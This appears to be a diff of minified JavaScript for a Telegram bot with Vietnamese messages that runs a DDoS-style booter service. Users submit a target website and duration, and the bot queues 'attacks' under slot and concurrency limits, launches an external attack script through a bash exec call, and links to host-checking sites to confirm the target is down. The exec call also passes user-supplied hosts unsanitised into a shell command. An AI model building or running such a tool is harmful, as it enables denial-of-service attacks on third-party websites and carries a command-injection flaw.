@@ -22,10 +22,10 @@ if([...x.values()].filter(v=>v.u===u).length>=L.slot)return bot.sendMessage(c,`�
 if(x.size>=L.concurrent){q.push({u,h,t:du,c,cl});return bot.sendMessage(c,'⏳ Đang chờ...',{parse_mode:'HTML'});}
 const pid=Math.floor(Math.random()*9000+1000);x.set(pid,{u,h,du,c,cl});
 bot.sendMessage(c,JSON.stringify({Status:"✨🚀🛸 Successfully 🛸🚀✨",Caller:`@${cl}`,"PID Attack":pid,Website:h,Time:`${du} Giây`,Maxslot:L.slot,Maxtime:L.maxTime,Methods:m,ConcurrentAttacks:x.size,StartTime:new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'})},null,2),{parse_mode:'HTML',reply_markup:{inline_keyboard:[[{text:'🔍 Check Host',url:`https://check-host.net/check-http?host=${h}`},{text:'🌐 Host Tracker',url:`https://www.host-tracker.com/en/ic/check-http?url=${h}`}]]}});
-exec(`./${C.script} "${h}" "${du}"`,{shell:'/bin/bash'},(e,o,er)=>{if(e)return;
+exec(`./${C.script} "${h}" "${du}"`,{shell:'/bin/bash'},(e)=>{if(e)return;
 bot.sendMessage(c,JSON.stringify({Status:"👽 END ATTACK 👽",Caller:`@${cl}`,"PID Attack":pid,Website:h,Methods:m,Time:`${du} Giây`,EndTime:new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'})},null,2),{parse_mode:'HTML'});x.delete(pid);
 if(q.length&&x.size<L.concurrent){const n=q.shift();bot.sendMessage(n.c,`📥 Bắt đầu: ${n.h} ${n.t}s`);bot.emit('message',{chat:{id:n.c},from:{id:n.u,username:n.cl},text:`${n.h} ${n.t}`});}});return;}
 if(!ad)return;
-if(text.trim()==='/pkill'){exec('pkill -9 -f "node.*\\.js"',(e,o,er)=>{bot.sendMessage(c,e?'❌ Lỗi khi dừng tiến trình':'✅ Đã dừng tất cả tiến trình',{parse_mode:'HTML'});x.clear();q=[];});return;}
+if(text.trim()==='/pkill'){exec('pkill -9 -f "node.*\\.js"',()=>{bot.sendMessage(c,'✅ Đã dừng tất cả tiến trình',{parse_mode:'HTML'});x.clear();q=[];});return;}
 if(text.trim()==='/on'){y=!0;bot.sendMessage(c,'✅ Bot đã bật',{parse_mode:'HTML'});return;}
 if(text.trim()==='/off'){y=!1;bot.sendMessage(c,'✅ Bot đã tắt',{parse_mode:'HTML'});return;}});
